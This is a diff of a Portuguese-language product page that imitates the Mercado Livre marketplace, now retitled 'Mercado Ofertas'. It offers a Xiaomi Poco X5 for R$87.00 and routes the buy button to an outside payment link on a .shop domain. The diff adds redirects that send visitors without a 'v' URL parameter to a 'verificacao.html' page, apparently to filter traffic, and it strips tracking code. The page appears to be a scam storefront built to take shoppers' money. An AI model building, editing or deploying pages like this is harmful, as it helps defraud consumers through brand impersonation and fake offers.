@@ -1,14 +1,17 @@
 <!DOCTYPE html><html lang="pt"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Mercado Livre</title>
-    <link rel="stylesheet" href="css/products.css">
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="css/fonts.css">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
-    <script async="" src="js/fbevents.js"></script><script src="js/tempo.js"></script>
-<script src="js/latest.js" async="" defer=""></script><script async="" defer="" src="js/pixel.js"></script></head>
-
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
 <script>
   window.pixelId = "66a3fc115f57e7496bcf1525";
   var a = document.createElement("script");
@@ -17,6 +20,7 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
+
 <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
@@ -24,45 +28,20 @@
   async
   defer
 ></script>
-<script>
-  window.googlePixelId = "686209b130d05cd268e2169e";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
-  document.head.appendChild(a);
-</script>
-
- <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '4006463016332041');
-fbq('track', 'PageView');
-</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Ofertas</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+    
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=4006463016332041&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
 <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '788754107203891');
-fbq('track', 'PageView');
-</script>
+
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=788754107203891&ev=PageView&noscript=1"
 /></noscript>
@@ -70,7 +49,7 @@ src="https://www.facebook.com/tr?id=788754107203891&ev=PageView&noscript=1"
 
 <body>
    
-    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 26 anos</div>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva</div>
 
     <nav class="navbar" style="padding-top: 15px;">
         <div class="menu-icon" style="padding-left: 3%;" onclick="window.location.href='index.html';">
@@ -78,7 +57,7 @@ src="https://www.facebook.com/tr?id=788754107203891&ev=PageView&noscript=1"
         </div>
 
         <div class="logo-central">
-            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+            
         </div>
 
         <div class="menu-icon" style="padding-right: 3%;">
@@ -137,25 +116,12 @@ src="https://www.facebook.com/tr?id=788754107203891&ev=PageView&noscript=1"
     <button class="pergunta-botao"
 onclick="
 
-fbq('track','AddToCart',{
-content_name:'Xiaomi Poco X5',
-content_ids:['pocox5'],
-content_type:'product',
-value:87.00,
-currency:'BRL'
-});
 
-fbq('track','InitiateCheckout',{
-content_name:'Xiaomi Poco X5',
-content_ids:['pocox5'],
-content_type:'product',
-value:87.00,
-currency:'BRL',
-num_items:1
-});
+
+
 
 setTimeout(function(){
-window.open('https://pay.comprasreaisdodia.com/meABG98plVKZ6Ea'+window.location.search,'_self');
+window.open('https://pay.comprasreaisdodia.shop/meABG98plVKZ6Ea'+window.location.search,'_self');
 },500);
 
 ">
@@ -321,3 +287,7 @@ window.open('https://pay.comprasreaisdodia.com/meABG98plVKZ6Ea'+window.location.
     
 <script src="js/latest_1.js" async="" defer=""></script>
 </div></div></div></body></html>
+
+
+
+
